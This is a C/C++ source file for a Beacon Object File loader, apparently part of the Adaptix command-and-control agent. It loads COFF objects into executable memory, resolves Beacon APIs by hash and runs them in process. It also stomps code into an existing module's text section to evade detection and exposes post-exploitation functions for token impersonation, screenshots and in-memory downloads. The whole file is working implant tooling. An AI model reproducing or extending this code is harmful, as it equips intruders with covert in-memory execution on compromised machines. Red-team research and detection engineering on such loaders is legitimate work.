#include "bof_loader.h"
#include "ProcLoader.h"
#include "utils.h"
#include "Boffer.h"

#define llabs(n) ((n) < 0 ? -(n) : (n))

#if defined(__x86_64__) || defined(_WIN64)
int IMP_LENGTH = 6;
#else
int IMP_LENGTH = 7;
#endif

int my_strncpy_s(char* dest, unsigned int destsz, const char* src, unsigned int count) {
	if (!dest || !src) return 1;
	if (destsz == 0)   return 2;

	unsigned int i = 0;
	for (; i < count && i < destsz - 1 && src[i] != '\0'; ++i)
		dest[i] = src[i];

	if (i < count && src[i] != '\0') {
		dest[0] = '\0';
		return 3;
	}
	dest[i] = '\0';
	return 0;
}

void InitBofOutputData()
{
	if (bofOutputPacker == NULL)
		bofOutputPacker = new Packer();
}

#define BEACON_FUNCTIONS_COUNT 32

BOF_API BeaconFunctions[BEACON_FUNCTIONS_COUNT] = {

	/// 5 - Data Parser API

	{ HASH_FUNC_BEACONDATAPARSE,              (LPVOID) BeaconDataParse },
	{ HASH_FUNC_BEACONDATAINT,                (LPVOID) BeaconDataInt },
	{ HASH_FUNC_BEACONDATASHORT,              (LPVOID) BeaconDataShort },
	{ HASH_FUNC_BEACONDATALENGTH,             (LPVOID) BeaconDataLength },
	{ HASH_FUNC_BEACONDATAEXTRACT,            (LPVOID) BeaconDataExtract },

	/// 2 - Output API

	{ HASH_FUNC_BEACONOUTPUT,                 (LPVOID) BeaconOutput },
	{ HASH_FUNC_BEACONPRINTF,                 (LPVOID) BeaconPrintf },

	/// 7 - Format API

	{ HASH_FUNC_BEACONFORMATALLOC,            (LPVOID) BeaconFormatAlloc },
	{ HASH_FUNC_BEACONFORMATRESET,            (LPVOID) BeaconFormatReset },
	{ HASH_FUNC_BEACONFORMATAPPEND,           (LPVOID) BeaconFormatAppend },
	{ HASH_FUNC_BEACONFORMATPRINTF,           (LPVOID) BeaconFormatPrintf },
	{ HASH_FUNC_BEACONFORMATTOSTRING,         (LPVOID) BeaconFormatToString },
	{ HASH_FUNC_BEACONFORMATFREE,             (LPVOID) BeaconFormatFree },
	{ HASH_FUNC_BEACONFORMATINT,              (LPVOID) BeaconFormatInt },

	/// 7 - Internal APIs

	{ HASH_FUNC_BEACONUSETOKEN,               (LPVOID) BeaconUseToken },
	{ HASH_FUNC_BEACONREVERTTOKEN,            (LPVOID) BeaconRevertToken },
	{ HASH_FUNC_BEACONISADMIN,                (LPVOID) BeaconIsAdmin },
	//{ HASH_FUNC_BEACONGETSPAWNTO,             BeaconGetSpawnTo },
	//{ HASH_FUNC_BEACONSPAWNTEMPORARYPROCESS,  BeaconSpawnTemporaryProcess },
	//{ HASH_FUNC_BEACONINJECTPROCESS,          BeaconInjectProcess },
	//{ HASH_FUNC_BEACONINJECTTEMPORARYPROCESS, BeaconInjectTemporaryProcess },
	//{ HASH_FUNC_BEACONCLEANUPPROCESS,         BeaconCleanupProcess },
	//{ HASH_FUNC_BEACONINFORMATION,            BeaconInformation },
	{ HASH_FUNC_TOWIDECHAR,					  (LPVOID) toWideChar },
	{ HASH_FUNC_BEACONADDVALUE,               (LPVOID) BeaconAddValue },
	{ HASH_FUNC_BEACONGETVALUE,               (LPVOID) BeaconGetValue },
	{ HASH_FUNC_BEACONREMOVEVALUE,            (LPVOID) BeaconRemoveValue },

	/// 2 - Adaptix APIs
	{ HASH_FUNC_AXADDSCREENSHOT,  (LPVOID) AxAddScreenshot },
	{ HASH_FUNC_AXDOWNLOADMEMORY, (LPVOID) AxDownloadMemory },

	/// 3 - Async BOF APIs
	{ HASH_FUNC_BEACONREGISTERTHREADCALLBACK,   (LPVOID) BeaconRegisterThreadCallback },
	{ HASH_FUNC_BEACONUNREGISTERTHREADCALLBACK, (LPVOID) BeaconUnregisterThreadCallback },
	{ HASH_FUNC_BEACONWAKEUP,                   (LPVOID) BeaconWakeup },
	{ HASH_FUNC_BEACONGETSTOPJOBEVENT,          (LPVOID) BeaconGetStopJobEvent },

	/// 5 - Other APIs

	{ HASH_FUNC_LOADLIBRARYA,                 (LPVOID) proxy_LoadLibraryA },
	{ HASH_FUNC_GETMODULEHANDLEA,             (LPVOID) proxy_GetModuleHandleA },
	{ HASH_FUNC_FREELIBRARY,                  (LPVOID) proxy_FreeLibrary },
	{ HASH_FUNC_GETPROCADDRESS,				  (LPVOID) proxy_GetProcAddress },
	{ HASH_FUNC___C_SPECIFIC_HANDLER,         NULL }, // GetProcAddress(kern, "__C_specific_handler");
};

void* FindProcBySymbol(char* symbol)
{
	if ( StrLenA(symbol) > IMP_LENGTH) {
		ULONG funcHash = Djb2A((PUCHAR) symbol + IMP_LENGTH);
		for (int i = 0; i < BEACON_FUNCTIONS_COUNT; i++) {
			if (funcHash == BeaconFunctions[i].hash) {
				if ( BeaconFunctions[i].proc != NULL ) 
					return BeaconFunctions[i].proc;
			}
		}

		char symbolCopy[1024] = { 0 };
		memcpy(symbolCopy, symbol, StrLenA(symbol));

		CHAR c1[] = { '$',0 };
		CHAR c2[] = { '@',0 };

		char* moduleName = symbolCopy + IMP_LENGTH;
		moduleName = StrTokA(moduleName, c1);

		char* funcName = StrTokA(NULL, c1);
		funcName = StrTokA(funcName, c2);

		funcHash = Djb2A((PUCHAR)funcName);
		HMODULE hModule = ApiWin->LoadLibraryA(moduleName);
		
		memset(symbolCopy, 0, StrLenA(symbol));

		if (hModule) 
			return GetSymbolAddress(hModule, funcHash);
	}

	return NULL;
}

char* PrepareEntryName(char* targetFuncName)
{
#if defined(__x86_64__) || defined(_WIN64)
	return targetFuncName;
#else
	int targetLength = StrLenA(targetFuncName);
	char* entryName = (char*)MemAllocLocal(targetLength + 2);
	if (!entryName)
		return NULL;

	entryName[0] = '_';
	memcpy(entryName + 1, targetFuncName, targetLength + 1);
	return entryName;
#endif
}

void FreeFunctionName(char* targetFuncName)
{
#if !defined(__x86_64__) && !defined(_WIN64)
	MemFreeLocal((LPVOID*) & targetFuncName, StrLenA(targetFuncName));
#endif
}

bool AllocateSections(unsigned char* coffFile, COF_HEADER* pHeader, PCHAR* mapSections, LPVOID* outMapFunctions)
{
    *outMapFunctions = NULL;

    if (g_BofStomp.initialised) {

        DWORD totalSize = 0;
        for (int i = 0; i < pHeader->NumberOfSections; i++) {
            COF_SECTION* s = (COF_SECTION*)(coffFile + sizeof(COF_HEADER) + sizeof(COF_SECTION) * i);
            DWORD slotSize = ALIGN_UP((DWORD)s->SizeOfRawData + UNWIND_SLOT_SIZE, 16);
            totalSize += slotSize;
        }
        totalSize += MAP_FUNCTIONS_SIZE;

        ApiWin->EnterCriticalSection(&g_BofStomp.lock);

        if (g_BofStomp.inUse || totalSize > (DWORD)g_BofStomp.textSize) {

            ApiWin->LeaveCriticalSection(&g_BofStomp.lock);
            goto fallback;
        }

        DWORD oldProt = 0;
        if (!ApiWin->VirtualProtect(g_BofStomp.textBase, totalSize, PAGE_EXECUTE_READWRITE, &oldProt)) {
            ApiWin->LeaveCriticalSection(&g_BofStomp.lock);
            goto fallback;
        }

        char* cursor = (char*)g_BofStomp.textBase;
        for (int i = 0; i < pHeader->NumberOfSections; i++) {
            COF_SECTION* s = (COF_SECTION*)(coffFile + sizeof(COF_HEADER) + sizeof(COF_SECTION) * i);
            DWORD slotSize = ALIGN_UP((DWORD)s->SizeOfRawData + UNWIND_SLOT_SIZE, 16);

            mapSections[i] = cursor;

            memset(cursor, 0, slotSize);

            if (s->PointerToRawData && s->SizeOfRawData)
                memcpy(cursor, coffFile + s->PointerToRawData, s->SizeOfRawData);

            if (s->SizeOfRawData)
                ((unsigned char*)cursor)[s->SizeOfRawData] = 0x01;

            cursor += slotSize;
        }

        memset(cursor, 0, MAP_FUNCTIONS_SIZE);
        *outMapFunctions = cursor;

        g_BofStomp.cursorBase = g_BofStomp.textBase;
        g_BofStomp.cursorSize = totalSize;
        g_BofStomp.inUse      = TRUE;

        return true;
    }

fallback:

    for (int i = 0; i < pHeader->NumberOfSections; i++) {
        COF_SECTION* s = (COF_SECTION*)(coffFile + sizeof(COF_HEADER) + sizeof(COF_SECTION) * i);
        DWORD allocSize = (DWORD)s->SizeOfRawData + UNWIND_SLOT_SIZE;

        mapSections[i] = (char*)ApiWin->VirtualAlloc(NULL, allocSize, MEM_COMMIT | MEM_RESERVE | MEM_TOP_DOWN, PAGE_EXECUTE_READWRITE);
        if (!mapSections[i] && s->SizeOfRawData)
            return false;

        memset(mapSections[i], 0, allocSize);

        if (s->PointerToRawData && s->SizeOfRawData)
            memcpy(mapSections[i], coffFile + s->PointerToRawData, s->SizeOfRawData);
    }

    *outMapFunctions = ApiWin->VirtualAlloc(NULL, MAP_FUNCTIONS_SIZE, MEM_COMMIT | MEM_RESERVE | MEM_TOP_DOWN, PAGE_EXECUTE_READWRITE);
    if (!*outMapFunctions) {
        for (int i = 0; i < pHeader->NumberOfSections; i++) {
            if (mapSections[i]) {
                ApiWin->VirtualFree(mapSections[i], 0, MEM_RELEASE);
                mapSections[i] = NULL;
            }
        }
        return false;
    }

    return true;
}

void CleanupSections(PCHAR* mapSections, int maxSections, LPVOID mapFunctions)
{

    BOOL stomped = FALSE;
    if (g_BofStomp.initialised && g_BofStomp.inUse) {

        for (int i = 0; i < maxSections; i++) {
            if (mapSections[i]) {
                ULONG_PTR sectionVA  = (ULONG_PTR)mapSections[i];
                ULONG_PTR stompStart = (ULONG_PTR)g_BofStomp.textBase;
                ULONG_PTR stompEnd   = stompStart + g_BofStomp.textSize;
                if (sectionVA >= stompStart && sectionVA < stompEnd) {
                    stomped = TRUE;
                }
                break;
            }
        }
    }

    if (stomped) {
        DWORD oldProt = 0;
        ApiWin->VirtualProtect(g_BofStomp.cursorBase, g_BofStomp.cursorSize, PAGE_EXECUTE_READWRITE, &oldProt);

        memset(g_BofStomp.cursorBase, 0, g_BofStomp.cursorSize);

        memcpy(g_BofStomp.cursorBase, g_BofStomp.savedBytes, g_BofStomp.cursorSize);

        ApiWin->VirtualProtect(g_BofStomp.cursorBase, g_BofStomp.cursorSize, PAGE_EXECUTE_READ, &oldProt);

        for (int i = 0; i < maxSections; i++)
            mapSections[i] = NULL;

        g_BofStomp.cursorBase = NULL;
        g_BofStomp.cursorSize = 0;
        g_BofStomp.inUse      = FALSE;
        ApiWin->LeaveCriticalSection(&g_BofStomp.lock);

    } else {

        for (int i = 0; i < maxSections; i++) {
            if (mapSections[i]) {
                ApiWin->VirtualFree(mapSections[i], 0, MEM_RELEASE);
                mapSections[i] = NULL;
            }
        }
        if (mapFunctions) {
            ApiWin->VirtualFree(mapFunctions, 0, MEM_RELEASE);
        }
    }
}

bool ProcessRelocations(unsigned char* coffFile, COF_HEADER* pHeader, PCHAR* mapSections,
                        COF_SYMBOL* pSymbolTable, LPVOID* mapFunctions)
{
    bool status = TRUE;
    int  mapFunctionsSize = 0;
    char* procSymbol = NULL;
    char  procSymbolShort[9] = { 0 };

    for (int sectionIndex = 0; sectionIndex < pHeader->NumberOfSections; sectionIndex++) {
        COF_SECTION* pSection = (COF_SECTION*)(coffFile + sizeof(COF_HEADER) + sizeof(COF_SECTION) * sectionIndex);
        COF_RELOCATION* pRelocTable = (COF_RELOCATION*)(coffFile + pSection->PointerToRelocations);

        for (int relocIndex = 0; relocIndex < pSection->NumberOfRelocations; relocIndex++) {
            COF_SYMBOL pSymbol = pSymbolTable[pRelocTable->SymbolTableIndex];
            if (pRelocTable->SymbolTableIndex >= pHeader->NumberOfSymbols) {
                BeaconOutput(BOF_ERROR_PARSE, NULL, 0);
                return FALSE;
            }

            int   offset     = 0;
            void* procAddress = NULL;
#ifdef _WIN64
            unsigned long long bigOffset = 0;
#endif

            if (pSymbol.Name.dwName[0] == 0) {
                procSymbol = ((char*)(pSymbolTable + pHeader->NumberOfSymbols)) + pSymbol.Name.dwName[1];
            } else {
                if (pSymbol.Name.cName[7] != 0) {
                    my_strncpy_s(procSymbolShort, sizeof(procSymbolShort), pSymbol.Name.cName, sizeof(pSymbol.Name.cName));
                    procSymbol = procSymbolShort;
                } else {
                    procSymbol = pSymbol.Name.cName;
                }
            }

            if (pSymbol.SectionNumber > 0) {
                procAddress = mapSections[pSymbol.SectionNumber - 1];
                procAddress = (void*)((char*)procAddress + pSymbol.Value);
            } else if (pSymbol.Value == 0 &&
                       (pSymbol.StorageClass == IMAGE_SYM_CLASS_EXTERNAL ||
                        pSymbol.StorageClass == IMAGE_SYM_CLASS_EXTERNAL_DEF)) {
                procAddress = FindProcBySymbol(procSymbol);
                if (procAddress == NULL &&
                    pSymbolTable[pRelocTable->SymbolTableIndex].SectionNumber == 0) {
                    BeaconOutput(BOF_ERROR_SYMBOL, procSymbol, StrLenA(procSymbol));
                    status = FALSE;
                } else {
                    ((LPVOID*)mapFunctions)[mapFunctionsSize] = procAddress;
                    procAddress = &((LPVOID*)mapFunctions)[mapFunctionsSize];
                    mapFunctionsSize++;
                }
            } else {
                BeaconOutput(BOF_ERROR_SYMBOL, "Undefined symbol", 17);
                status = FALSE;
            }

            if (status != FALSE) {
#ifdef _WIN64
                if (pRelocTable->Type == IMAGE_REL_AMD64_ADDR64) {
                    memcpy(&bigOffset, mapSections[sectionIndex] + pRelocTable->VirtualAddress, sizeof(unsigned long long));
                    bigOffset += (unsigned long long)procAddress;
                    memcpy(mapSections[sectionIndex] + pRelocTable->VirtualAddress, &bigOffset, sizeof(unsigned long long));
                } else if (pRelocTable->Type == IMAGE_REL_AMD64_ADDR32NB) {

                    memcpy(&offset, mapSections[sectionIndex] + pRelocTable->VirtualAddress, sizeof(int));
                    offset += (int)((char*)mapSections[pSymbol.SectionNumber - 1] - (char*)mapSections[0]) + pSymbolTable[pRelocTable->SymbolTableIndex].Value;
                    memcpy(mapSections[sectionIndex] + pRelocTable->VirtualAddress, &offset, sizeof(int));
                } else if (pRelocTable->Type == IMAGE_REL_AMD64_REL32 ||
                           pRelocTable->Type == IMAGE_REL_AMD64_REL32_1 ||
                           pRelocTable->Type == IMAGE_REL_AMD64_REL32_2 ||
                           pRelocTable->Type == IMAGE_REL_AMD64_REL32_3 ||
                           pRelocTable->Type == IMAGE_REL_AMD64_REL32_4 ||
                           pRelocTable->Type == IMAGE_REL_AMD64_REL32_5) {
                    offset = 0;
                    int typeIndex = pRelocTable->Type - 4;
                    memcpy(&offset, mapSections[sectionIndex] + pRelocTable->VirtualAddress,
                           sizeof(int));
                    if (llabs((long long)procAddress - (long long)(mapSections[sectionIndex] + pRelocTable->VirtualAddress + 4 + typeIndex))
                        > UINT_MAX) {
                        return FALSE;
                    }
                    offset += ((size_t)procAddress - ((size_t)mapSections[sectionIndex] + pRelocTable->VirtualAddress + 4 + typeIndex));
                    memcpy(mapSections[sectionIndex] + pRelocTable->VirtualAddress, &offset, sizeof(int));
                }
#else
                if (pRelocTable->Type == IMAGE_REL_I386_DIR32) {
                    offset = 0;
                    memcpy(&offset, mapSections[sectionIndex] + pRelocTable->VirtualAddress, sizeof(int));
                    offset = (unsigned int)procAddress + offset;
                    memcpy(mapSections[sectionIndex] + pRelocTable->VirtualAddress, &offset, sizeof(unsigned int));
                } else if (pRelocTable->Type == IMAGE_REL_I386_REL32) {
                    offset = 0;
                    memcpy(&offset, mapSections[sectionIndex] + pRelocTable->VirtualAddress, sizeof(int));
                    offset = (unsigned int)procAddress - (unsigned int)(mapSections[sectionIndex] + pRelocTable->VirtualAddress + 4);
                    memcpy(mapSections[sectionIndex] + pRelocTable->VirtualAddress, &offset, sizeof(unsigned int));
                }
#endif
            }
            pRelocTable = (COF_RELOCATION*)((char*)pRelocTable + sizeof(COF_RELOCATION));
        }
    }
    return status;
}

void ExecuteProc(char* entryFuncName, unsigned char* args, int argsSize, COF_SYMBOL* pSymbolTable, COF_HEADER* pHeader, PCHAR* mapSections)
{
#ifdef _WIN64
    BOF_RUNTIME_FUNCTION* rfEntries       = NULL;
    DWORD                 rfEntriesSize   = 0;
    int                   registeredCount = 0;
#endif
    BOOL                  entryFound      = FALSE;

#ifdef _WIN64
    for (int si = 0; si < pHeader->NumberOfSections; si++) {
        COF_SECTION* s = (COF_SECTION*)((unsigned char*)pHeader + sizeof(COF_HEADER) + sizeof(COF_SECTION) * si);

        if (memcmp(s->Name, ".pdata\0\0", 8) != 0) continue;
        if (!s->SizeOfRawData || !s->PointerToRawData) break;

        int numEntries = (int)(s->SizeOfRawData / sizeof(BOF_RUNTIME_FUNCTION));
        if (numEntries <= 0) break;

        DWORD bofPdataSize = s->SizeOfRawData;
        BOF_RUNTIME_FUNCTION* bofPdata = (BOF_RUNTIME_FUNCTION*)MemAllocLocal(bofPdataSize);
        if (!bofPdata) break;

        memcpy(bofPdata, (unsigned char*)pHeader + s->PointerToRawData, bofPdataSize);

        COF_RELOCATION* relocs = (COF_RELOCATION*)((unsigned char*)pHeader + s->PointerToRelocations);
        for (int ri = 0; ri < s->NumberOfRelocations; ri++) {
            COF_RELOCATION* r   = &relocs[ri];
            COF_SYMBOL      sym = pSymbolTable[r->SymbolTableIndex];

            if (r->Type != IMAGE_REL_AMD64_ADDR32NB) continue;
            if (sym.SectionNumber <= 0 || sym.SectionNumber > pHeader->NumberOfSections) continue;

            char* targetBase = mapSections[sym.SectionNumber - 1];
            if (!targetBase) continue;

            DWORD* field  = (DWORD*)((unsigned char*)bofPdata + r->VirtualAddress);
            DWORD  addend = *field;
            *field = (DWORD)((ULONG_PTR)targetBase - (ULONG_PTR)mapSections[0] + (DWORD)sym.Value + addend);
        }

        rfEntries     = bofPdata;
        rfEntriesSize = bofPdataSize;
        bofPdata      = NULL;
        {
            BOOL ok = (BOOL)(ULONG_PTR)ApiNt->RtlAddFunctionTable(
                (void*)rfEntries, numEntries, (DWORD64)mapSections[0]
            );
            if (ok) registeredCount = 1;
        }

        if (bofPdata)
            MemFreeLocal((LPVOID*)&bofPdata, bofPdataSize);
        break;
    }
#endif

    for (int i = 0; i < pHeader->NumberOfSymbols; i++) {
        if (StrCmpA(pSymbolTable[i].Name.cName, entryFuncName) == 0) {
            void(*proc)(char*, unsigned long) = (void(*)(char*, unsigned long)) (mapSections[pSymbolTable[i].SectionNumber - 1] + pSymbolTable[i].Value);
            proc((char*)args, argsSize);
            entryFound = TRUE;
            break;
        }
    }

#ifdef _WIN64
    if (rfEntries) {
        if (registeredCount == 1) {
            ApiNt->RtlDeleteFunctionTable((void*)rfEntries);
        } else {
            for (int j = 0; j < registeredCount; j++)
                ApiNt->RtlDeleteFunctionTable((void*)&rfEntries[j]);
        }
    }
#endif

RET:
#ifdef _WIN64
    if (rfEntries)
        MemFreeLocal((LPVOID*)&rfEntries, rfEntriesSize);
#endif

    if (!entryFound)
        BeaconOutput(BOF_ERROR_ENTRY, NULL, 0);
}

Packer* ObjectExecute(ULONG taskId, char* targetFuncName, unsigned char* coffFile, unsigned int cofFileSize, unsigned char* args, int argsSize)
{
    COF_HEADER* pHeader      = NULL;
    COF_SYMBOL* pSymbolTable = NULL;
    PCHAR       entryFuncName = NULL;
    LPVOID      mapFunctions  = NULL;
    BOOL        result        = FALSE;
    PCHAR       mapSections[MAX_SECTIONS] = { 0 };

    InitBofOutputData();
    bofTaskId = taskId;

    if (!coffFile || !targetFuncName)
        goto RET;

    pHeader      = (COF_HEADER*)coffFile;
    pSymbolTable = (COF_SYMBOL*)(coffFile + pHeader->PointerToSymbolTable);

    entryFuncName = PrepareEntryName(targetFuncName);
    if (!entryFuncName) {
        BeaconOutput(BOF_ERROR_ENTRY, NULL, 0);
        goto RET;
    }

    result = AllocateSections(coffFile, pHeader, mapSections, &mapFunctions);
    if (!result) {
        BeaconOutput(BOF_ERROR_ALLOC, NULL, 0);
        goto RET;
    }

    if (!mapFunctions) {
        BeaconOutput(BOF_ERROR_ALLOC, NULL, 0);
        goto RET;
    }

    result = ProcessRelocations(coffFile, pHeader, mapSections, pSymbolTable, (LPVOID*)mapFunctions);
    if (!result)
        goto RET;

    ExecuteProc(entryFuncName, args, argsSize, pSymbolTable, pHeader, mapSections);

RET:
    FreeFunctionName(entryFuncName);
    CleanupSections(mapSections, MAX_SECTIONS, mapFunctions);
    bofTaskId = 0;
    return bofOutputPacker;
}